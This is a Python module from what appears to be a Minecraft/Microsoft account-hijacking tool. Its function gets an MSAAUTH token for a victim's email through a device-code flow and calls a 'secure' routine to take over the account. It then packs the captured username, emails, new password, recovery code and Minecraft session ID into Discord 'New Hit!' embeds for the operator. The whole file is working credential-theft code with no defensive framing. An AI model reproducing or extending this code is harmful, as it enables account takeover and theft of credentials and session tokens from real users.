from views.utils.getMSAAUTH import getMSAAUTH
from views.utils.secure import secure
from discord import Embed
import json

def startSecuringAccount(email: str, device: str = None, code: str = None):
    if not device:
        device = json.load(open("data.json", "r+"))["flowtoken"] 
    
    # str or None
    msaauth = getMSAAUTH(email, device, code)
    
    if msaauth is None:
        print("[-] - Failed to get MSAAUTH")
        return msaauth
    
    print("[+] - Got MSAAUTH | Starting to secure...")
    account = secure(msaauth)
    print(account)

    hit_embed = Embed(
        title = f"New Hit!"
    )

    # To replace oldEmail -> Email (New Alias)
    hit_embed.add_field(name = "Username:\n", value = f"```{account["oldName"]}```\n")
    hit_embed.add_field(name = "Method:\n", value = f"```{account["method"]}```")
    hit_embed.add_field(name = "Capes:\n", value = f"```{account["capes"]}```\n")
    hit_embed.add_field(name = "Email:\n", value = f"```{account["oldEmail"]}```")
    hit_embed.add_field(name = "Security Email:\n", value = f"```{account["secEmail"]}```\n")
    hit_embed.add_field(name = "Password:\n", value = f"```{account["password"]}```\n")
    hit_embed.add_field(name = "Recovery Code:\n", value = f"```{account["recoveryCode"]}```")

    if account["SSID"] != "Failed to Get":
        session_embed = Embed(
            title = f"Got Minecraft Session! | {account["oldName"]}",
            description = f"```{account["SSID"]}```"
        )

        return [hit_embed, session_embed]

    return [hit_embed]